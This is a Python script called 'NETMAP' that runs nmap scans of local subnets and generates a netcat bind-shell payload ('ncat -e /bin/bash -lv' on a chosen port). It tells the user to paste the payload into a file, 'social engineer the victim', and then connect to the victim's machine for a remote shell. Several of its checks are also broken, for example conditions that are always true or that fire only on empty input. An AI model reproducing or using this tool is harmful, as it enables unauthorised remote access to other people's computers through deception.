import os
import colorama
import time
from colorama.ansi import Fore
from pyfiglet import Figlet, figlet_format

colorama.init()

print(Fore.GREEN + "NETMAP")

options = input("Create a NetCat listner and start attacking Windows, Mac OS, and Linux devices, scan networks for open ports and more: ")

      
if options == "scan network":
    print("Ok...")
    
    
    choose_ip_range = input(Fore.MAGENTA + "Does your network IP start with 192 or 10, if not sure type 'not sure', and python will grab data: ")   
    if choose_ip_range == "192":
        os.system("sudo nmap -sF 192.168.1.0/24")
        furthur_inspect = input("Would you like to search more indepth on a certain local IP: ")
        if furthur_inspect == "yes":
            grab_IP = input("Please enter the specific IP Address: ")
            if grab_IP == "":
                print("Ok...running a portscan on" + grab_IP)
                os.system("sudo nmap -F " + grab_IP)
  
    if choose_ip_range == "10":
        os.system("sudo nmap -sF 10.0.0.1/24")
        furthur_inspect = input("Would you like to search more indepth on a certain local IP: ")
        if furthur_inspect == "yes":
            grab_IP = input("Please enter the specific IP Address: ")
            if grab_IP == "":
                print("Ok...running a portscan on" + grab_IP)
                os.system("sudo nmap -F " + grab_IP)
    
    if choose_ip_range == "not sure":
        os_choose = input("What OS are you running Mac, Windows, or Linux")
        if os_choose == "linux" or "unix" or "mac":
            os.system("ifconfig")
        print("Tip: look for inet (local ip)")
        print("rerun the script to enter IP 10 or 192")
        if os_choose == "linux" or "unix" or "mac":
            os.system("ipconfig")
            print("Tip: look for IPv4 address: IP Adress)")
            print("rerun the script to enter IP 10 or 192")
    
if options == "ncat listener":
    port_choice = input("What port would you like running ncat on: ")
    print("import os \n os.system('sudo apt install python3-pip') \n os.system('sudo apt install ncat') \n os.system(""ncat -e '/bin/bash' -lv " + port_choice)
    print("\n there is the python code.")
    print("\n paste this into the ncatlistner.py file and social engineer the victim")
    print("\n \n to see if the victim as ran the code, run a network scan from the choices above.")
    remote_in = input("If you already have a confirmed session type 'yes': ")
    if remote_in == "yes":
        ip_of_session = input("What is the IP of the victim: ")
        port_of_session = input("What is the port of the victim: ")
        start_session = os.system("sudo ncat -v " + ip_of_session + " " + port_of_session)          
else: print("Not a valid choice, try again")
